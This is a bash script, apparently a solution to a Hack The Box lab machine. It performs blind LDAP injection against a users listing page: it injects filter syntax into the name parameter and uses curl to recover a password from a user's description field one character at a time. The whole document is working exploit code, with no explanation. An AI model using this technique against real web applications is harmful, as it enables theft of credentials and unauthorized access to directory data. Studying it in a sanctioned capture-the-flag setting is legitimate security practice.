#!/bin/bash
Brute_User() {
    wordlist="/usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt"
    user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    password_length=8  # Change to your desired password length

    found_password=""

    while [ ${#found_password} -lt $password_length ]; do
        found_char=""
        for char in $(echo "$alphabet" | sed 's/./&\n/g'); do
            test_password="${found_password}${char}"
            url="http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description=${test_password}*)"
            response=$(curl -s -k -X 'GET' \
                -H 'Host: internal.analysis.htb' -H 'Accept: */*' -H "$user_agent" -H 'Connection: close' \
                "$url" -x http://127.0.0.1:8080)

            # Check if the response contains certain success indicators (customize as needed)
            if echo "$response" | grep -q "technician"; then
                found_char="$char"
                found_password="${found_password}${found_char}"
                echo "Found valid character: $found_char"
                break
            fi
        done

        # If a character was not found, it means we've reached the end of the password
        if [ -z "$found_char" ]; then
            break
        fi
    done

    echo "Found valid password: $found_password"
}

Brute_User
